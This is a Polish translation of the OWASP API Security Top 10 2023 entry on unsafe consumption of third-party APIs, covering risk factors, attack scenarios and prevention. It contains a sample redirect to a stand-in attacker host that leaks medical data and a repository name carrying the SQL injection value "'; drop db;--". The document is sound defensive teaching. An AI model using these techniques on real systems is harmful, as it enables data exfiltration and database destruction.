# API10:2023 Niebezpieczna konsumpcja API

| Źródła zagrożeń/Wektory ataku | Słaby punkt bezpieczeństwa | Wpływ |
| - | - | - |
| Zależne od API : Możliwość wykorzystania **Łatwa** | Powszechność **Częsta** : Wykrywalność **Średnia** | Techniczny **Poważny** : Zależny od biznesu |
| Wykorzystanie tego problemu wymaga od atakujących zidentyfikowania i potencjalnie skompromitowania innych API/usług, z którymi zintegrowane jest docelowe API. Zwykle informacje te nie są publicznie dostępne, a zintegrowane API/usługi nie są łatwe do wykorzystania. | Programiści mają tendencję do ufania endpointom, które komunikują się z zewnętrznymi API lub API stron trzecich, bez ich weryfikacji, i polegają na słabszych wymaganiach bezpieczeństwa, np. w zakresie bezpieczeństwa transportu, uwierzytelniania/autoryzacji oraz walidacji i sanityzacji danych wejściowych. Atakujący muszą zidentyfikować usługi, z którymi zintegrowane jest docelowe API (źródła danych), i ostatecznie je skompromitować. | Wpływ zależy od tego, co docelowe API robi z pobranymi danymi. Udane wykorzystanie może prowadzić do ujawnienia informacji wrażliwych nieuprawnionym podmiotom, wielu rodzajów wstrzyknięć lub odmowy usługi. |

## Czy API jest podatne?

Programiści mają tendencję do ufania danym otrzymanym z API stron trzecich
bardziej niż danym wejściowym od użytkowników. Dotyczy to szczególnie API
oferowanych przez dobrze znane firmy. Z tego powodu programiści często stosują
słabsze standardy bezpieczeństwa, np. w zakresie walidacji i sanityzacji
danych wejściowych.

API może być podatne, jeśli:

* Komunikuje się z innymi API przez nieszyfrowany kanał;
* Nie waliduje i nie sanityzuje prawidłowo danych pozyskanych z innych API
  przed ich przetworzeniem lub przekazaniem do komponentów podrzędnych;
* Bezrefleksyjnie podąża za przekierowaniami;
* Nie ogranicza ilości zasobów dostępnych do przetwarzania odpowiedzi usług
  stron trzecich;
* Nie implementuje limitów czasu dla interakcji z usługami stron trzecich;

## Przykładowe scenariusze ataków

### Scenariusz nr 1

API korzysta z usługi strony trzeciej do wzbogacania adresów firm podawanych
przez użytkowników. Gdy użytkownik końcowy przekaże adres do API, jest on
wysyłany do usługi strony trzeciej, a zwrócone dane są następnie zapisywane
w lokalnej bazie danych SQL.

Atakujący wykorzystują usługę strony trzeciej do zapisania ładunku SQLi
powiązanego z utworzoną przez siebie firmą. Następnie biorą na cel podatne
API, podając określone dane wejściowe, które sprawiają, że API pobiera ich
„złośliwą firmę” z usługi strony trzeciej. Ładunek SQLi zostaje ostatecznie
wykonany przez bazę danych, eksfiltrując dane na serwer kontrolowany przez
atakującego.

### Scenariusz nr 2

API integruje się z zewnętrznym dostawcą usług w celu bezpiecznego
przechowywania wrażliwych danych medycznych użytkowników. Dane są wysyłane
przez bezpieczne połączenie za pomocą żądania HTTP podobnego do poniższego:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Atakujący znaleźli sposób na skompromitowanie API strony trzeciej, które
zaczyna odpowiadać na żądania takie jak powyższe kodem
`308 Permanent Redirect`.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Ponieważ API bezrefleksyjnie podąża za przekierowaniami strony trzeciej,
powtórzy dokładnie to samo żądanie, łącznie z wrażliwymi danymi użytkownika,
ale tym razem na serwer atakującego.

### Scenariusz nr 3

Atakujący może przygotować repozytorium git o nazwie `'; drop db;--`.

Gdy atakowana aplikacja zostanie zintegrowana ze złośliwym repozytorium,
ładunek wstrzyknięcia SQL zostanie użyty w aplikacji, która buduje zapytanie
SQL, zakładając, że nazwa repozytorium to bezpieczne dane wejściowe.

## Jak zapobiegać

* Oceniając dostawców usług, sprawdź poziom bezpieczeństwa ich API.
* Upewnij się, że cała komunikacja z API odbywa się przez bezpieczny kanał
  komunikacji (TLS).
* Zawsze waliduj i prawidłowo sanityzuj dane otrzymane ze zintegrowanych API
  przed ich użyciem.
* Utrzymuj listę dozwolonych, dobrze znanych lokalizacji, do których
  zintegrowane API mogą przekierowywać Twoje API: nie podążaj bezrefleksyjnie
  za przekierowaniami.


## Źródła

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### Zewnętrzne

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html
